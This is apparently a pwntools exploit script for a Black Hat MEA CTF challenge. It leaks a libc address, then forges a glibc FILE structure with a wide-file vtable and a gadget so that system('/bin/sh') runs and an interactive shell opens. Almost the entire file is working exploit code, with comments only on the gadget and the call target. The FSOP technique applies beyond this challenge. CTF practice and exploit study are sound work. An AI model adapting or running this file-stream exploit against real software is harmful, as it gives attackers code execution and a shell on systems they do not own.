#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
source /home/mark/Desktop/CTF/Blackhatmea/File101/libio/
brva 0x01215
commands
    b *__run_exit_handlers+0x25f
    b *_IO_cleanup+0x28
    b *_IO_flush_all+0x1a2
    b *_IO_flush_all+0xe3
    b *_IO_wdoallocbuf+0x2d
end
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()



def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    #file_struct = p32(_flags) + \
    #         p32(0) + \
    file_struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct


def solve():

    payload = p64(0xfbad1887)+p64(0)*3

    io.sendlineafter(b":", payload)
    io.recvline()
    leak = u64(io.recv(8))
    libc.address = leak - 0x204644
    info("libc base: %#x", libc.address)
    
    stderr_lock = libc.sym["_IO_stdfile_2_lock"]
    stderr = libc.sym['_IO_2_1_stderr_']
    fake_vtable = libc.sym['_IO_wfile_jumps'] + 0x8

    gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx
    target = libc.address + 0x2044f0
    
    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101 # 0x1000000000000001
    fake._IO_read_end = libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_ptr = 0x1
    fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock = stderr_lock
    fake._codecvt = stderr + 0xb8
    fake._wide_data = stderr + 0x200
    fake.unknown2 = p64(0)*2 + p64(stderr+0x20) + p64(0)*3 + p64(fake_vtable)

    io.sendline(bytes(fake))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

